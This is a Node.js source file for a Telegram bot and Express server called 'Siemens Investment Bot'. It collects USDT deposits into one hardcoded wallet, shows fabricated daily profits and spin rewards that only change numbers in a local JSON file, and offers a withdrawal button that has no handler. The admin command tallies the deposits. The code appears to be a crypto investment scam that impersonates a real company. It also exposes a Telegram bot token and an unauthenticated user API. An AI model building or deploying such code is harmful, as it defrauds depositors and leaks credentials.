const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(cors());

const TELEGRAM_TOKEN = '8559882529:AAEaEMGDZkhe-HybjM2PZIKniDqJH-g50pc';
const ADMIN_CHAT_ID = '6559439220';
const MY_WALLET_ADDRESS = '0xDdAE2e4e81A39C4E68faFAFd8b6aa05192f7A123';

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const DB_FILE = path.join(__dirname, 'database.json');

function readDatabase() {
if (!fs.existsSync(DB_FILE)) {
const defaultData = {
"6559439220": { balance: 62.20, totalDeposited: 20.00, refCount: 0, voucherCount: 0 }
};
fs.writeFileSync(DB_FILE, JSON.stringify(defaultData, null, 2));
return defaultData;
}
try {
return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
} catch (err) {
return {};
}
}

function saveDatabase(data) {
fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

app.use(express.static(path.join(__dirname, 'public')));

// API دریافت اطلاعات کاربر
app.get('/api/user', (req, res) => {
const userId = req.query.userId || '6559439220';
const db = readDatabase();

if (!db[userId]) {
db[userId] = {
balance: 0.00,
totalDeposited: 0.00,
refCount: 0,
voucherCount: 0
};
saveDatabase(db);
}

res.json({
userId: userId,
balance: db[userId].balance,
totalDeposited: db[userId].totalDeposited,
refCount: db[userId].refCount,
voucherCount: db[userId].voucherCount
});
});

// API ثبت پاداش روزانه
app.post('/api/claim-daily', (req, res) => {
const { userId } = req.body;
const db = readDatabase();
if (!db[userId]) return res.json({ success: false, message: 'User not found' });

if (db[userId].totalDeposited < 20.00) {
return res.json({ success: false, message: 'Minimum deposit required is 20 USDT' });
}

db[userId].balance += 1.00;
saveDatabase(db);
res.json({ success: true, newBalance: db[userId].balance });
});

// API گردونه شانس
app.post('/api/spin', (req, res) => {
const { userId } = req.body;
const db = readDatabase();
if (!db[userId]) return res.json({ success: false, message: 'User not found' });

if (db[userId].totalDeposited < 20.00) {
return res.json({ success: false, message: 'Minimum deposit required is 20 USDT' });
}

const reward = parseFloat((Math.random() * 5).toFixed(2));
db[userId].balance += reward;
saveDatabase(db);
res.json({ success: true, reward, newBalance: db[userId].balance });
});

// API اطلاعات واریز
const walletData = {
status: 'success',
address: MY_WALLET_ADDRESS,
network: 'BEP20 (USDT)'
};
app.get('/api/deposit', (req, res) => res.json(walletData));

// --- ربات تلگرام ---
function sendMainMenu(chatId, text) {
bot.sendMessage(chatId, text, {
reply_markup: {
inline_keyboard: [
[{ text: '💳 Deposit USDT', callback_data: 'deposit' }],
[{ text: '📊 Dashboard', callback_data: 'dashboard' }, { text: '👥 Referral Link', callback_data: 'referral' }],
[{ text: '💸 Withdraw Balance', callback_data: 'withdraw' }]
]
}
});
}

bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
const chatId = msg.chat.id.toString();
const referrerId = match[1] ? match[1] : null;
const db = readDatabase();

if (!db[chatId]) {
db[chatId] = {
balance: 0.00,
totalDeposited: 0.00,
refCount: 0,
voucherCount: 0,
referredBy: referrerId
};
if (referrerId && db[referrerId]) {
db[referrerId].refCount = (db[referrerId].refCount || 0) + 1;
}
saveDatabase(db);
}
sendMainMenu(chatId, 'Welcome to Siemens Investment Bot!');
});

bot.onText(/\/admin/, (msg) => {
const chatId = msg.chat.id.toString();
if (chatId !== ADMIN_CHAT_ID) return;

const db = readDatabase();
const users = Object.keys(db);
let totalDep = 0;
let totalBal = 0;
users.forEach(u => {
totalDep += db[u].totalDeposited || 0;
totalBal += db[u].balance || 0;
});

const stats = '👑 *Admin Control Panel*\n\n👥 Total Users: *' + users.length + '*\n💰 Total Deposits: *' + totalDep.toFixed(2) + ' USDT*\n🏦 Total Balances: *' + totalBal.toFixed(2) + ' USDT*';
bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
});

bot.on('callback_query', async (query) => {
try { await bot.answerCallbackQuery(query.id); } catch (e) {}

const chatId = query.message.chat.id.toString();
const data = query.data;
const db = readDatabase();

if (!db[chatId]) {
db[chatId] = { balance: 0.00, totalDeposited: 0.00, refCount: 0, voucherCount: 0 };
saveDatabase(db);
}

if (data === 'deposit') {
const text = '💳 *Deposit USDT (BEP-20)*\n\nSend your deposit to the following BEP-20 address:\n\n`' + MY_WALLET_ADDRESS + '`\n\n_Note: Minimum deposit is 20 USDT._';
bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

if (data === 'dashboard') {
const user = db[chatId];
const dailyProfit = Math.floor((user.totalDeposited || 0) / 20) * 1;
const text = '📊 *User Dashboard*\n\n💰 Total Deposit: *' + (user.totalDeposited || 0) + ' USDT*\n📈 Daily Profit: *' + dailyProfit + ' USDT/day*\n💵 Available Balance: *' + (user.balance || 0) + ' USDT*';
bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

if (data === 'referral') {
bot.getMe().then((botInfo) => {
const refLink = 'https://t.me/' + botInfo.username + '?start=' + chatId;
bot.sendMessage(chatId, '👥 *Your Referral Link:*\n\n`' + refLink + '`\n\nTotal Referrals: *' + (db[chatId].refCount || 0) + '*', { parse_mode: 'Markdown' });
});
}
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
console.log('Server and Bot are running on port ' + PORT);
});
